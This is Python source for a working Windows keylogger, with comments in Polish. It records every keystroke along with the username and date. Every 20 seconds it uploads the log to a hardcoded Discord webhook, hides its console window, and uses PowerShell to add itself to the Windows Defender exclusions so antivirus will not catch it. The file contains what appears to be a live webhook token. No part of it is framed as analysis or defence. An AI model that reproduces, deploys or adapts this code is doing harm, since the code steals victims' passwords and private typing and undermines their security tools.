import os
import requests
import shutil
import tempfile
import subprocess
import win32gui
import pythoncom
import keyboard
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = 20  # częstotliwość wysyłania raportów w sekundach
WEBHOOK = "https://discord.com/api/webhooks/1252318266714619936/QOs16L3ro2s9rMbb27HKlAPlUqZg91g2uCMbkqpSDl9tW1_NLrtQegKXPjTIDq8AAOpY"

class Klasa:
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.dzien = now.strftime('%d/%m/%Y')
        self.godzina = now.strftime('%H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"\n[{name.upper()}] "
        self.log += name

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Użytkownik: {self.username} \nData: {self.dzien} \nGodzina: {self.godzina}\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Użytkownik: {self.username} \nData: {self.dzien} \nGodzina: {self.godzina}", description=self.log)
            webhook.add_embed(embed)
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()

def hide_console_window():
    console_window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(console_window, 0)

def add_to_defender_exceptions():
    script_path = os.path.abspath(__file__)
    ps_command = f"Add-MpPreference -ExclusionPath '{script_path}'"
    try:
        subprocess.run(["powershell", "-Command", ps_command], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Błąd dodawania do wyjątków Windows Defender: {e}")

if __name__ == '__main__':
    add_to_defender_exceptions()  # Dodanie skryptu do wyjątków Windows Defender
    klasa = Klasa(interval=SEND_REPORT_EVERY, report_method="webhook")
    klasa.start()
    hide_console_window()
    pythoncom.PumpMessages()
